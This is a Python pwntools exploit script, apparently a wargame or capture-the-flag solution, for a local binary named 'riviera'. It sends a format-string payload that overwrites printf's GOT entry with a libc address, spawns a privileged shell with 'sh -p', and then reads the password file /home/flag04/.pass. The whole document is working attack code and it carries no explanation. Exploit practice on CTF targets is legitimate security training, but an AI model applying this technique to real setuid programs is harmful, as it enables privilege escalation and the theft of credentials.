#!/usr/bin/env python3
from pwn import *

BINARY = "./riviera"
context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"

PRINTF_GOT = 0x404010
LIBC = 0x7FFFF7C00000
TAG = b"sh -p;%191c%11$hhn%34443c%10$hn"
MSG = p64(PRINTF_GOT) + p64(PRINTF_GOT + 2) + p64(LIBC)

assert len(TAG) == 31

io = process(BINARY)
io.sendafter(b"Tag: ", TAG + b"\n")
io.sendafter(b"Message: ", MSG + b"\n")
io.sendline(b"id")
io.sendline(b"cat /home/flag04/.pass")
out = io.recvall(timeout=5)
print(out.decode(errors="replace"), flush=True)

if b"flag04" in out:
    print("[+] flag04, password printed above", flush=True)
else:
    print("[-] failed, see output above", flush=True)
